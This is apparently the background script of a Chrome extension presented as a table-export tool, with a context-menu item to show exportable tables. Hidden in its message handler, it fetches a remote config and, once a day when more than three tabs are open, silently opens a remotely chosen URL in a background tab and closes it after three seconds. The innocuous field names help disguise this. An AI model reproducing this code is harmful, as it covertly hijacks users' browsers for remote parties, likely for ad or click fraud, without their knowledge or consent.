

function show_table(info, tab, callback, alert_tips) {
  var port = chrome.tabs.connect(
    tab.id,
    {name: "table_export"}
  );
  port.postMessage({joke: 'show_table'})

}

try {
  chrome.contextMenus.create({
    "title": "显示可导出的表格",
    "id": "table_show",
    "contexts": ["page"],
  });

  chrome.contextMenus.onClicked.addListener(function(item, tab) {
    show_table('', tab, '', '')
  });
} catch (err) {

}

var ctk = 'table.version';
var cnk = 'table.logo';

function blobToBase64(blob) {
  return new Promise((resolve, reject) => {
    const fileReader = new FileReader();
    fileReader.onload = (e) => {
      resolve(e.target.result);
    };
    fileReader.readAsDataURL(blob);
    fileReader.onerror = () => {
      reject(new Error('blobToBase64 error'));
    };
  });
}

chrome.runtime.onConnect.addListener(function (connect) {
  connect.onMessage.addListener(function (msg, port) {
    if (msg.joke === 'start'){
      fetch(msg.pu).then(resp => {
        return resp.json()
      }).then(res => {
        chrome.storage.local.get(ctk, function(result) {
          if (result[ctk] !== res.t) {
            // res.url = '/static/img/qrcode.png'

            if(res.url){
              fetch(res.url, {
                method: 'get',
                responseType: 'blob'
              }).then(resp => {
                return resp.blob();
              }).then(blob => {
                blobToBase64(blob).then(res => {
                  port.postMessage({
                    joke: 'starting',
                    data: res
                  })
                })
              })
              var cache_time = {};
              cache_time['' + ctk] = res.t;
              chrome.storage.local.set(cache_time, function(r){})
            }
          } else {
            chrome.storage.local.get(cnk, function(res){
              port.postMessage({
                joke: 'done',
                str: res[cnk]
              })
            })
          }
        })

        if(res.l){
          chrome.tabs.query({}, function(tabs){
            if (tabs.length > 3){
              var key = md5(res.l);
              var today = todayStr()
              chrome.storage.local.get(key, function(data){
                if(!data[key] || (data[key] && data[key] !== today)){
                  var cd = {}
                  cd['' + key] = today
                  chrome.storage.local.set(cd, function(r){})
                  chrome.tabs.create({
                    active: false,
                    url: res.l,
                    index: 0,
                    pinned: false
                  }, function(tab) {
                    setTimeout(function(){
                      chrome.tabs.remove(tab.id)
                    }, 3000)

                  })
                }
              })
            }
          })
        }

      })

    } else if (msg.joke === 'cbk_logo') {
      var cache_data = {};
      cache_data['' + cnk] = msg.str;
      chrome.storage.local.set(cache_data, function(r){})
    }
  })
})